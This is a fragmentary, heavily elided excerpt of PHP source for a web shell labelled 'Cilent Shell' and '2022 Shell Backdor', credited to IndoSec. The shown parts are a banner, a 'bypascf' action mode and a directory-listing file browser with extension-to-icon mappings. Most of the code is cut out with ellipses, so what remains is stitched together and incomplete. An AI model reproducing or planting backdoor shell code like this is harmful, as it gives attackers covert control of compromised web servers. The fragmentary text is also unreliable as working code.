...
.html(filenames.join(","));
		...
		echo '
		<div class="container">
			<h1 class="text-center"><a href="https://www.dhenbhocil.my.id/" style="color:#ffffff;">{ Cilent Shell }</h1>
			<center><h5>( 2022 Shell Backdor }</a></h5></center>
			<hr/>
	...
	*/
	...
	if ($_GET['aksi'] == 'bypascf') {
		...
		echo '<center><div id="tab"><table class="text-white mt-1 table-hover table-responsive">
			...
			foreach($scandir as $file){
				...
				echo '<tr>
					...
					if($ext == "php") {
						echo 'https://cdn-icons-png.flaticon.com/512/2721/2721279.png"';
					}elseif ($ext == "html") {
						echo 'https://cdn-icons-png.flaticon.com/512/136/136528.png';
					}elseif ($ext == "css") {
						echo 'https://cdn-icons-png.flaticon.com/512/136/136527.png"';
					}elseif ($ext == "png") {
						echo 'https://cdn-icons-png.flaticon.com/512/136/136523.png';
					}elseif ($ext == "jpg") {
						echo 'https://cdn-icons-png.flaticon.com/512/29/29264.png"';
					}elseif ($ext == "jpeg") {
						echo 'https://cdn-icons-png.flaticon.com/512/29/29264.png"';
					}elseif($ext == "zip") {
						echo 'https://cdn-icons-png.flaticon.com/512/28/28814.png"';
					}elseif ($ext == "js") {
						echo 'https://cdn-icons-png.flaticon.com/512/4179/4179598.png';
					}elseif ($ext == "ttf") {
						echo 'https://cdn-icons-png.flaticon.com/512/29/29558.png';
					}elseif ($ext == "otf") {
						echo 'https://cdn-icons-png.flaticon.com/512/29/29567.png';
					}elseif ($ext == "txt") {
						echo 'https://cdn-icons-png.flaticon.com/512/28/28878.png';
					}elseif ($ext == "ico") {
						echo 'https://cdn-icons-png.flaticon.com/512/29/29508.png';
					}elseif ($ext == "conf") {
						echo 'https://cdn-icons-png.flaticon.com/512/627/627495.png';
					}elseif ($ext == "htaccess") {
						echo 'https://cdn-icons.flaticon.com/png/512/735/premium/735761.png?token=exp=1648663032~hmac=9b9927859e24eb2682d707824331f847';
					}elseif ($ext == "sh") {
						echo 'https://image.flaticon.com/icons/png/128/617/617535.png';
					}elseif ($ext == "py") {
						echo 'https://image.flaticon.com/icons/png/128/180/180867.png';
					}elseif ($ext == "indsc") {
						echo 'https://cdn-icons-png.flaticon.com/512/6963/6963139.png';
					}elseif ($ext == "sql") {
		...
		echo '</table></div><hr/><a href="https://www.dhenbhocil.my.id" class="text-muted">Copyright 2019 { IndoSec }</a></center><br/>';	
